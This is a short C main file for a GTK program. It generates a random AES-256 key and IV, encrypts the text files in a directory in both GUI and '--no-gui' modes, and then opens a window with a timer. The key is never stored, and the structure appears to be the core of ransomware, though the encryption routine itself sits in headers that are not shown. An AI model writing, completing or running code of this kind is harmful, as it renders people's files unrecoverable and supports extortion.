#include <gtk/gtk.h>
#include "timer.h"
#include "ui.h"
#include "aes_keygen.h"
#include <string.h>
#include <stdio.h>

#define AES_KEY_LENGTH 32  // 32 bytes for AES-256
#define AES_IV_LENGTH 16   // 16 bytes for IV (AES CBC mode)

int main(int argc, char *argv[]) {
    gboolean gui_enabled = TRUE;

    // Check for "--no-gui" flag
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--no-gui") == 0) {
            gui_enabled = FALSE;
        }
    }

    // Initialize AES key generation (example)
    unsigned char aes_key[AES_KEY_LENGTH];
    unsigned char aes_iv[AES_IV_LENGTH];
    generate_random_bytes(aes_key, AES_KEY_LENGTH);
    generate_random_bytes(aes_iv, AES_IV_LENGTH);

    // Encrypt the text files in the directory (this happens in both modes)
    encrypt_txt_files_in_directory(aes_key, aes_iv);

    // If GUI is enabled, initialize GTK and run the GUI
    if (gui_enabled) {
        gtk_init(&argc, &argv);

        // Initialize the main window and other components
        GtkWidget *window = create_main_window();

        // Start the timer
        start_timer(window);

        // Main GTK loop
        gtk_main();
    } 

    return 0;
}
